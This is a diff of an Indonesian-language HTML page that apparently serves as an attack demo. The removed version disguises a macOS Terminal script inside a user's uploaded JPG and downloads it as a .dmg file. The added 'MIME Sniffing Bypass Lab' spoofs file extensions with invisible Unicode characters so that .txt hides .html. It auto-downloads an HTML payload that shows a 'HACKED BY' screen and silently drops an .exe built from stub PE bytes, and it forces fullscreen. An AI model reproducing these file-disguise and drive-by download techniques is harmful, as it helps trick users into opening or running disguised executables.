@@ -1,93 +1,213 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>File Picker Spoofing - JPG to DMG</title>
-<style>
-* { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0a0a; color: #fff; padding: 20px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-.panel { background: #1e1e1e; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); max-width: 500px; text-align: center; border: 1px solid #333; }
-h1 { font-size: 28px; color: #4CAF50; margin-bottom: 15px; }
-p { font-size: 15px; color: #aaa; margin-bottom: 25px; line-height: 1.6; }
-input[type="file"] { display: none; }
-button { width: 100%; padding: 18px; cursor: pointer; border: none; border-radius: 8px; background: #0078d4; color: #fff; font-weight: bold; font-size: 18px; box-shadow: 0 4px 15px rgba(0, 120, 212, 0.4); transition: background 0.2s; margin-bottom: 10px; }
-button:hover { background: #005a9e; }
-button:disabled { background: #555; cursor: not-allowed; }
-#status { margin-top: 20px; font-weight: bold; color: #ff9800; font-size: 14px; font-family: monospace; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <!-- Uji Header Content-Type: Browser akan membaca ini saat file dibuka -->
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>MIME Sniffing Bypass Lab</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
+        .panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
+        h2 { margin-bottom: 10px; }
+        p { margin-bottom: 15px; line-height: 1.5; }
+        button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
+        button:hover { background: #b71c1c; }
+        #status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
+        #downloads { margin-top: 20px; display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 10px; }
+        #downloads a { display: block; padding: 8px; background: #212121; color: #80df82; text-decoration: none; border-radius: 4px; font-size: 12px; text-align: center; border: 1px solid #424242; word-break: break-all; }
+    </style>
 </head>
 
 <body>
 <div class="panel" id="main-panel">
-    <h1>📸 Unggah Gambar Anda</h1>
-    <p>Pilih file JPG. Sistem akan memprosesnya menjadi file .dmg yang berisi script Terminal.</p>
-    
-    <input type="file" id="fileInput" accept="image/jpeg, image/jpg">
-    <button id="pick-btn" type="button">Pilih Gambar (JPG)</button>
-    
-    <div id="status" role="status">Menunggu interaksi...</div>
+    <h2>MIME Sniffing Bypass Lab</h2>
+    <p>Menguji bypass filter ekstensi menggunakan Unicode, Microtasks, dan manipulasi Content-Type.</p>
+    <button id="start-btn" type="button">Mulai Uji Coba</button>
+    <div id="status" role="status">Sistem siap.</div>
+    <div id="downloads"></div>
 </div>
 
 <script>
-const pickBtn = document.getElementById("pick-btn");
-const fileInput = document.getElementById("fileInput");
+const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
+const downloadsDiv = document.getElementById("downloads");
 
-pickBtn.addEventListener("click", () => {
-    fileInput.click();
-});
+let activeUrls = [];
+let isProcessing = false;
 
-fileInput.addEventListener("change", function(event) {
-    const file = event.target.files[0];
-    if (!file) return;
+const speak = (message) => {
+    if ('speechSynthesis' in window) {
+        window.speechSynthesis.cancel();
+        const utterance = new SpeechSynthesisUtterance(message);
+        utterance.lang = 'id-ID';
+        window.speechSynthesis.speak(utterance);
+    }
+};
 
-    statusDiv.textContent = "Memproses gambar dan membuat file DMG...";
-    pickBtn.disabled = true;
+// 1. Fungsi membuat nama file dengan karakter tersembunyi (Unicode & Braille)
+function generateSpoofedFilename(baseName) {
+    // Braille Blank Space (U+2800) dan Zero-Width Space (U+200B)
+    const brailleBlank = "\u2800";
+    const zeroWidth = "\u200B";
+    const invisibleChar = "\u2060"; // Word Joiner
+    
+    // Menyisipkan karakter tak terlihat di antara .txt dan .html
+    // Tujuannya agar filter melihat ".txt", tapi browser tetap merender HTML.
+    return `${baseName}.txt${brailleBlank}${zeroWidth}.html${invisibleChar}`;
+}
 
-    const reader = new FileReader();
+// 2. Payload HTML yang akan disuntikkan
+const prepareMimeBlobAsync = (i) => {
+    return new Promise((resolve) => {
+        queueMicrotask(() => {
+            const payloadText = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <meta charset='UTF-8'>
+                    <title>HACKED BY</title>
+                    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                </head>
+                <body style='margin:0;background:#000;color:#0f0;font-family:monospace;cursor:pointer'>
+                    <div style='display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center'>
+                        <h1 style='font-size:80px;color:#f00;text-shadow:0 0 20px #f00;animation:pulse 1s infinite'>HACKED BY</h1>
+                        <h2 style='font-size:36px;color:#0f0;text-shadow:0 0 15px #0f0'>WAGURI</h2>
+                        <p style='font-size:18px;color:#0f0;opacity:0.8'>Your system has been compromised.</p>
+                        <p style='font-size:14px;color:#ff0;font-weight:bold;' id='status'>Memicu Microtask...</p>
+                    </div>
+                    <style>@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.5} }</style>
+                    <script>
+                        (function(){
+                            "use strict";
+                            document.getElementById('status').textContent = 'Origin: ' + (window.location.origin || 'null');
+                            
+                            function b64KeBytes(b64){
+                                var binary = atob(b64);
+                                var len = binary.length;
+                                var bytes = new Uint8Array(len);
+                                for (var i = 0; i < len; i++) bytes[i] = binary.charCodeAt(i);
+                                return bytes;
+                            }
+                            
+                            var b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
+                            var sudah = false;
+                            
+                            // 3. Nested Asynchronous Microtasks sebagai pengganti alert()
+                            function picuDownload(){
+                                if (sudah) return;
+                                sudah = true;
+                                var statusEl = document.getElementById('status');
+                                try{
+                                    statusEl.textContent = 'Menyiapkan payload...';
+                                    var bytesArr = b64KeBytes(b64Data);
+                                    var blob = new Blob([bytesArr], { type: 'application/octet-stream' });
+                                    var url = URL.createObjectURL(blob);
+                                    var a = document.createElement('a');
+                                    a.href = url;
+                                    a.download = 'hacked-by-anonymous.exe';
+                                    a.style.display = 'none';
+                                    document.body.appendChild(a);
+                                    a.click();
+                                    setTimeout(function(){
+                                        if (a.parentNode) a.parentNode.removeChild(a);
+                                        URL.revokeObjectURL(url);
+                                    }, 3000);
+                                    statusEl.textContent = 'Payload berhasil diunduh!';
+                                    statusEl.style.color = '#0f0';
+                                } catch(e){
+                                    statusEl.textContent = 'Gagal: ' + e.message;
+                                    statusEl.style.color = '#f00';
+                                    sudah = false;
+                                }
+                            }
+                            
+                            // Microtask Chaining
+                            queueMicrotask(() => {
+                                queueMicrotask(() => {
+                                    queueMicrotask(() => {
+                                        picuDownload();
+                                    });
+                                });
+                            });
+                        })();
+                    <\/script>
+                </body>
+                </html>
+            `;
+            const blob = new Blob([payloadText], { type: "text/html" });
+            const url = URL.createObjectURL(blob);
+            resolve({ id: i, url: url });
+        });
+    });
+};
 
-    reader.onload = function(e) {
-        const arrayBuffer = e.target.result;
+const triggerInstantDownload = (fileData) => {
+    const link = document.createElement("a");
+    link.href = fileData.url;
+    
+    // Terapkan nama file dengan karakter tersembunyi
+    link.download = generateSpoofedFilename(`waguri-file-${fileData.id}`);
+    
+    link.textContent = `Blob #${fileData.id} (Spoofed)`;
+    link.style.display = "none";
+    downloadsDiv.appendChild(link);
+    link.click();
+};
 
-        // Script Terminal macOS yang akan dieksekusi
-        const shellScript = "#!/bin/bash\n" +
-                            "echo 'System Update...'\n" +
-                            "open -a Terminal\n" +
-                            "osascript -e 'tell application \"Terminal\" to do script \"echo HACKED BY WAGURI; open -a Calculator\"'\n";
+const processLoop = async (counter) => {
+    if (!isProcessing) return;
 
-        // Konversi gambar JPG ke Base64
-        const base64Jpg = btoa(String.fromCharCode.apply(null, new Uint8Array(arrayBuffer)));
+    const fileData = await prepareMimeBlobAsync(counter);
+    activeUrls.push(fileData.url);
 
-        // Buat konten final: Script Shell + Gambar (sebagai komentar)
-        const finalContent = shellScript + "\n# Gambar Asli disisipkan di sini:\n# " + base64Jpg;
+    triggerInstantDownload(fileData);
 
-        // Buat Blob dengan MIME application/octet-stream
-        const blob = new Blob([finalContent], { type: 'application/octet-stream' });
-        
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url;
-        
-        // Simpan dengan nama .dmg
-        let originalName = file.name;
-        let baseName = originalName.substring(0, originalName.lastIndexOf('.')) || originalName;
-        a.download = baseName + '.dmg'; 
-        
-        document.body.appendChild(a);
-        a.click();
-        
-        setTimeout(() => {
-            if (a.parentNode) a.parentNode.removeChild(a);
-            URL.revokeObjectURL(url);
-        }, 3000);
+    statusDiv.textContent = `Proses Berjalan: Berkas ke-${counter} dikirim`;
 
-        statusDiv.textContent = "File .dmg berhasil diunduh. (Buka dengan Terminal)";
-        statusDiv.style.color = '#4CAF50';
-        pickBtn.disabled = false;
-    };
+    if (counter % 10 === 0) {
+        speak(`Proses mencapai ${counter} berkas.`);
+    }
 
-    reader.readAsArrayBuffer(file);
+    // Hentikan di 1 file untuk demonstrasi
+    if (counter >= 1) {
+        isProcessing = false;
+        startBtn.disabled = false;
+        return;
+    }
+
+    setTimeout(() => processLoop(counter + 1), 0);
+};
+
+startBtn.addEventListener("click", () => {
+    if (isProcessing) return;
+
+    activeUrls.forEach(url => URL.revokeObjectURL(url));
+    activeUrls = [];
+    downloadsDiv.replaceChildren();
+
+    speak("Mengaktifkan mode layar penuh.");
+
+    const root = document.documentElement;
+    try {
+        if (root.requestFullscreen) {
+            root.requestFullscreen();
+        } else if (root.webkitRequestFullscreen) {
+            root.webkitRequestFullscreen();
+        } else if (root.mozRequestFullScreen) {
+            root.mozRequestFullScreen();
+        }
+        statusDiv.textContent = "Mengunci layar penuh...";
+    } catch (err) {
+        console.warn("Fullscreen tidak didukung atau ditolak:", err);
+    }
+
+    setTimeout(() => {
+        isProcessing = true;
+        speak("Proses pembuatan berkas Blob dimulai.");
+        processLoop(1);
+    }, 300);
 });
 </script>
 </body>
